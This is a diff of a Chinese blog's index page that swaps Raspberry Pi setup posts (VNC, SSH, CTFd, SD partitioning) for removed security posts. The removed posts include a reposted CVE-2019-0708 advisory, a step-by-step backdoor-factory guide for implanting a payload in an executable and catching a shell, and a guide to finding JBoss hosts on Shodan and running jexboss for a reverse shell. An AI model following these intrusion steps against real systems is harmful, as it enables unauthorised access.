+        <p>1、sudo apt-get install tightvncserver 2、开启vnc服务 tightvncserver （tip：首次开启需要配置密码，密码位数6-8位） 3、VCN常用控制 停止VNC窗口：vncserver -kill:1 修改密码：vncpasswd 重启服务器：service vncserver restart 4、安装远程桌面服务（xrdp） sudo apt-get install xrdp 5、修改配置文件 vi ~/.vnc/xstartup 在 x-window-manager &amp; 的后面新增下面这 1 行： <strong>mate-session &amp;</strong> 配置文件修改后，需要重启VNC服务。 6、远程桌面（mstsc.exe）连接树莓派 <img src="http://112.74.49.123/wp-content/uploads/2017/11/QQ%E6%88%AA%E5%9B%BE20171121165327.jpg" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2017/11/7.jpg" alt=""></p>
 
       
 
@@ -502,7 +804,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/威胁情报//" class="article-tag-list-link color5">威胁情报</a>
+        			<a href="/categories/树莓派//" class="article-tag-list-link color4">树莓派</a>
         		</li>
       		
 		</ul>
@@ -511,7 +813,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-2/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc/">展开全文 >></a>
         </p>
       
 
@@ -541,27 +843,27 @@
 
 
   
-    <article id="post-prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/">Prevent a worm by updating Remote Desktop Services (CVE-2019-0708)</a>
+      <a class="article-title" href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh/">树莓派Ubuntu Mate系统中开启ssh</a>
     </h1>
   
 
         
-        <a href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/" class="archive-article-date">
-  	<time datetime="2019-05-15T01:54:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-15</time>
+        <a href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh/" class="archive-article-date">
+  	<time datetime="2017-11-21T08:47:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Today Microsoft released fixes for a critical Remote Code Execution vulnerability, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>, in Remote Desktop Services – formerly known as Terminal Services – that affects some older versions of Windows. The Remote Desktop Protocol (RDP) itself is not vulnerable. This vulnerability is pre-authentication and requires no user interaction. In other words, the vulnerability is ‘wormable’, meaning that any future malware that exploits this vulnerability could propagate from vulnerable computer to vulnerable computer in a similar way as the WannaCry malware spread across the globe in 2017. While we have observed no exploitation of this vulnerability, it is highly likely that malicious actors will write an exploit for this vulnerability and incorporate it into their malware. Now that I have your attention, it is important that affected systems are patched as quickly as possible to prevent such a scenario from happening. In response, we are taking the unusual step of providing a security update for all customers to protect Windows platforms, including some out-of-support versions of Windows. Vulnerable in-support systems include Windows 7, Windows Server 2008 R2, and Windows Server 2008. Downloads for in-support versions of Windows can be found in the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Microsoft Security Update Guide</a>. Customers who use an in-support version of Windows and have automatic updates enabled are automatically protected.  Out-of-support systems include Windows 2003 and Windows XP. If you are on an out-of-support version, the best way to address this vulnerability is to upgrade to the latest version of Windows. Even so, we are making fixes available for these out-of-support versions of Windows in <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">KB4500705</a>. Customers running Windows 8 and Windows 10 are not affected by this vulnerability, and it is no coincidence that later versions of Windows are unaffected. Microsoft invests heavily in strengthening the security of its products, often through major architectural improvements that are not possible to backport to earlier versions of Windows. There is partial mitigation on affected systems that have <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732713(v=ws.11)" target="_blank" rel="noopener">Network Level Authentication (NLA)</a> enabled. The affected systems are mitigated against ‘wormable’ malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate. It is for these reasons that we strongly advise that all affected systems – irrespective of whether NLA is enabled or not – should be updated as soon as possible. Resources <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Links to downloads for Windows 7, Windows 2008 R2, and Windows 2008</a> <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">Links to downloads for Windows 2003 and Windows XP</a> Simon Pope, Director of Incident Response, Microsoft Security Response Center (MSRC) <strong>____</strong>分割线<strong><strong>__</strong></strong> 我只是个搬运工，别打我</p>
+        <p>树莓派安装好Ubuntu mate后，默认没有开启ssh，所以无法进行ssh登录。 成功开启的方法如下： 1、ps -e |grep ssh 如果可以看到ssh-agent，说明Ubuntu缺省安装了openssh-client，可以在树莓派ssh登录其他系统 如果可以看到sshd，说明安装了openssh-server，可以从其他系统通过ssh登录到树莓派。 2、新装的系统是看不到sshd进程的，原因在于默认是不开起该项服务的。通过以下过程开启 1）配置树莓派，sudo raspi-config命令进入树莓派设置 <img src="http://112.74.49.123/wp-content/uploads/2017/11/raspi-config.jpg" alt=""> 2）选择第3项，并回车 <img src="http://112.74.49.123/wp-content/uploads/2017/11/1.jpg" alt=""> 3）选择P2 SSH并回车 <img src="http://112.74.49.123/wp-content/uploads/2017/11/raspi-config.jpg" alt=""> 4）选择yes并回车 5）等待开启完成并回车确认 6）完成后退出配置即可，现在ps -e|grep ssh应该可以看到sshd了 <img src="http://112.74.49.123/wp-content/uploads/2017/11/mate-ssh.jpg" alt=""></p>
 
       
 
@@ -576,7 +878,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/威胁情报//" class="article-tag-list-link color5">威胁情报</a>
+        			<a href="/categories/树莓派//" class="article-tag-list-link color4">树莓派</a>
         		</li>
       		
 		</ul>
@@ -585,7 +887,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e7-b3-bb-e7-bb-9f-e4-b8-ad-e5-bc-80-e5-90-afssh/">展开全文 >></a>
         </p>
       
 
@@ -615,27 +917,27 @@
 
 
   
-    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ctfd-e6-90-ad-e5-bb-ba" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-2/">内网渗透后门(一)：backdoor-factory</a>
+      <a class="article-title" href="/2017/11/19/ctfd-e6-90-ad-e5-bb-ba/">CTFd搭建</a>
     </h1>
   
 
         
-        <a href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-2/" class="archive-article-date">
-  	<time datetime="2019-04-06T17:26:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-07</time>
+        <a href="/2017/11/19/ctfd-e6-90-ad-e5-bb-ba/" class="archive-article-date">
+  	<time datetime="2017-11-19T12:28:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。 第一步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor1.jpg" alt="选择一个想要植入后门的exe"> 选择一个想要植入后门的exe，将该exe拷贝至kali 第二步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor2.jpg" alt="检查是否能被植入后门"> 检查是否能被植入后门 第三步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor3.jpg" alt="检查是否有足够空间用于加载后门"> 检查是否有足够空间用于加载后门 第四步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor4.jpg" alt="查看能够使用的payload"> 查看能够使用的payload 第五步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor5.jpg" alt="设置payload"> 设置payload并选择加载payload的位置，上图选择将payload加载在2处 第六步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor6.jpg" alt="msf开启监听"> 攻击机的msf开启监听 第七步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor7.jpg" alt="在靶机中执行带有后门的exe"> 在靶机中执行带有后门的exe 第八步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor8.jpg" alt="接收到shell"> 接收到shell</p>
+        <p><strong>0x00 前言</strong> 快到社团活动线下赛的时间了，搭个CTF平台用来做活动。 早就看中了CTFd这个平台，正好又要活动了，于是直接搭建。 系统: Ubuntu server 16.04 nginx: nginx/1.10.3 (Ubuntu) Mysql: 5.7.20-0ubuntu0.16.04.1 (Ubuntu) Python: 2.7.12 <strong>0x01 下载项目&amp;环境配置</strong> 下载 git clone <a href="https://github.com/isislab/CTFd.git" target="_blank" rel="noopener">https://github.com/isislab/CTFd.git</a> 在<a href="https://github.com/CTFd/CTFd下有个Install" target="_blank" rel="noopener">https://github.com/CTFd/CTFd下有个Install</a> Install: Run ./prepare.sh to install dependencies using apt. Modify CTFd/config.py to your liking. Use python serve.py in a terminal to drop into debug mode. Here are some deployment options You can check out the Getting Started guide for a breakdown of some of the features you need to get started. 环境： Nginx可以apt-get install nginx，mysql的话ubuntu server自带，python系统自带。 Ubuntu-server搭好之后apt-get update一下，然后apt-get upgrade一下，把该更新的都更新了。 <strong>0x02 安装&amp;排错</strong> 环境配置好了之后，运行CTFd-master目录下的./prepare.sh 之后CTFd/config.py文件，把HOST改成服务器ip CTFd-master目录下的server.py里边的host也改成服务器ip 这是为了方便外部访问。 然后再CTFd-master目录下python server.py 可以看到平台启动成功，running on ip：端口 现在就可以通过<a href="http://ip:port访问平台了，就酱" target="_blank" rel="noopener">http://ip:port访问平台了，就酱</a>~</p>
 
       
 
@@ -650,7 +952,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/内网渗透//" class="article-tag-list-link color5">内网渗透</a>
+        			<a href="/categories/CTF平台搭建//" class="article-tag-list-link color3">CTF平台搭建</a>
         		</li>
       		
 		</ul>
@@ -659,7 +961,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-2/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/11/19/ctfd-e6-90-ad-e5-bb-ba/">展开全文 >></a>
         </p>
       
 
@@ -689,27 +991,27 @@
 
 
   
-    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/">内网渗透后门(一)：backdoor-factory</a>
+      <a class="article-title" href="/2017/11/19/e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89/">管理树莓派SD卡分区空间（linux分区管理）</a>
     </h1>
   
 
         
-        <a href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/" class="archive-article-date">
-  	<time datetime="2019-04-06T17:26:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-07</time>
+        <a href="/2017/11/19/e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89/" class="archive-article-date">
+  	<time datetime="2017-11-19T09:22:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。 第一步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor1.jpg" alt="选择一个想要植入后门的exe"> 选择一个想要植入后门的exe，将该exe拷贝至kali 第二步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor2.jpg" alt="检查是否能被植入后门"> 检查是否能被植入后门 第三步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor3.jpg" alt="检查是否有足够空间用于加载后门"> 检查是否有足够空间用于加载后门 第四步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor4.jpg" alt="查看能够使用的payload"> 查看能够使用的payload 第五步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor5.jpg" alt="设置payload"> 设置payload并选择加载payload的位置，上图选择将payload加载在2处 第六步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor6.jpg" alt="msf开启监听"> 攻击机的msf开启监听 第七步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor7.jpg" alt="在靶机中执行带有后门的exe"> 在靶机中执行带有后门的exe 第八步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor8.jpg" alt="接收到shell"> 接收到shell</p>
+        <p>前几天入了个树莓派3b+，一到手就各种系统：Ubuntu-server Ubuntu-mate，但是这些都不适合做安全，于是，我上了神器，kali-2017.2-rpi3-nexmon 首先下载并把镜像烧写到SD卡上。然后进树莓派，装系统。 装完之后进去发现就一个空壳啊，什么都没有，搜了一下才发现，原来还要装工具：apt-get install kali-linux-all 安装过程中报错，磁盘剩余空间不足。但我用的是32G内存卡啊，df -h一下才发现，/分区只分了两个多G。 于是，修改SD卡分区。 首先，查看一下硬盘使用情况，命令如下： df -h 然后用fdisk命令进行分区操作 (实际操作前最好先熟悉一下fdisk的用法) 命令格式： fdisk &lt;存储设备名&gt; //如: fdisk /dev/sda 进入fdisk 后，使用单键命令 m 显示Help p 列出所有分区 d 删除分区 n 新建分区 w 存盘退出 q 不存盘退出 对主设备进行fdisk，命令如下： sudo fdisk /dev/sda (如果是在物理机器上操作，命令应是 sudo fdisk /dev/mmcblk0) 按 p 键 列出所有分区，可见有两个或三个分区 第一个分区是 FAT32分区，是引导用的 第二个分区是Linux 主分区 第三个分区是Linux Swap交换文件分区(虚拟机中可能没有) 用笔记下Linux 主分区的Start Sector号 按 d 键 Partition Number (分区号) 选 2, 删除linux主分区（第2个区） 如果有linuxSwap分区，再按d键 Partition Number (分区号) 选 3, 删除linuxSwap分区（第3个区） 按 p 键 列出所有分区，可见只剩第一个分区了 按 n 键，重新创建linux主分区 Partition Type(分类类型) 选 P (Primary) Partition Number (分区号) 选 2 First Sector(起始Sector) 一定要输入刚才记下来的Start Sector号 Last Sector (终止Sector)用默认值，直接回车 按 p 键 列出所有分区，可见有两个分区，linux主分区在第2个，起始位置是原位置 按 w 键 存盘退出fdisk 接下来，立即重启，不要做任何其它事情 sudo reboot 重启并登录后，立即用以下命令 sudo resize2fs /dev/sda2 (如果是在物理机器上操作，命令应是sudo resize2fs /dev/mmcblk0p2) 该命令将把第二个分区扩展到新的空间中 查看一下硬盘使用情况，OK了 df -h 上述操作的原理是： 首先删除了linux主分区和Swap分区，重建的主分区起始Sector位置与原主分区一致，再resize2fs，则原主分区数据完全没变，但改变了主分区的大小。</p>
 
       
 
@@ -724,81 +1026,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/内网渗透//" class="article-tag-list-link color5">内网渗透</a>
+        			<a href="/categories/linux通用//" class="article-tag-list-link color3">linux通用</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-1/">内网渗透后门(一)：backdoor-factory</a>
-    </h1>
-  
-
-        
-        <a href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-1/" class="archive-article-date">
-  	<time datetime="2019-04-06T17:26:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。 第一步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor1.jpg" alt="选择一个想要植入后门的exe"> 选择一个想要植入后门的exe，将该exe拷贝至kali 第二步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor2.jpg" alt="检查是否能被植入后门"> 检查是否能被植入后门 第三步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor3.jpg" alt="检查是否有足够空间用于加载后门"> 检查是否有足够空间用于加载后门 第四步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor4.jpg" alt="查看能够使用的payload"> 查看能够使用的payload 第五步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor5.jpg" alt="设置payload"> 设置payload并选择加载payload的位置，上图选择将payload加载在2处 第六步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor6.jpg" alt="msf开启监听"> 攻击机的msf开启监听 第七步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor7.jpg" alt="在靶机中执行带有后门的exe"> 在靶机中执行带有后门的exe 第八步： <img src="http://112.74.49.123/wp-content/uploads/2019/04/backdoor8.jpg" alt="接收到shell"> 接收到shell</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
+      		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/内网渗透//" class="article-tag-list-link color5">内网渗透</a>
+        			<a href="/categories/linux通用/树莓派//" class="article-tag-list-link color4">树莓派</a>
         		</li>
       		
 		</ul>
@@ -807,155 +1039,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/04/07/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e5-90-8e-e9-97-a8-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/">jboss低版本漏洞拿站</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/" class="archive-article-date">
-  	<time datetime="2019-01-24T09:24:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="http://112.74.49.123/wp-content/uploads/2019/01/1.png" alt="在shodan找目标网站-1"> 在shodan找目标网站，我们设定目标为jboss<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/2.png" alt="使用脚本-2"> 打开目标站，确认可以连接<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/3.png" alt="使用脚本-3"> 使用脚本，确认漏洞是否存在<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/4.png" alt="使用脚本-4"> 选择yes，使用exp攻击漏洞<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/5.png" alt="使用脚本-5"> 反弹shell，设置自己的vps开启监听，输入自己的vps的ip和监听port<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/6.png" alt="使用脚本-6"> 接收到shell，并且可正常使用<br>脚本下载方式：<a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a> 该脚本依赖于python2<br>使用方式： 1.安装必要的python库 <code>pip install -r requires.txt</code> 2.执行 <code>python jexboss.py -host http://ip:port</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-1/">jboss低版本漏洞拿站</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-1/" class="archive-article-date">
-  	<time datetime="2019-01-24T09:24:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="http://112.74.49.123/wp-content/uploads/2019/01/1.png" alt="在shodan找目标网站-1"> 在shodan找目标网站，我们设定目标为jboss<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/2.png" alt="使用脚本-2"> 打开目标站，确认可以连接<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/3.png" alt="使用脚本-3"> 使用脚本，确认漏洞是否存在<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/4.png" alt="使用脚本-4"> 选择yes，使用exp攻击漏洞<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/5.png" alt="使用脚本-5"> 反弹shell，设置自己的vps开启监听，输入自己的vps的ip和监听port<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/6.png" alt="使用脚本-6"> 接收到shell，并且可正常使用<br>脚本下载方式：<a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a> 该脚本依赖于python2<br>使用方式： 1.安装必要的python库 <code>pip install -r requires.txt</code> 2.执行 <code>python jexboss.py -host http://ip:port</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-1/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/11/19/e7-ae-a1-e7-90-86-e6-a0-91-e8-8e-93-e6-b4-besd-e5-8d-a1-e5-88-86-e5-8c-ba-e7-a9-ba-e9-97-b4-ef-bc-88linux-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-ef-bc-89/">展开全文 >></a>
         </p>
       
 
@@ -987,7 +1071,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
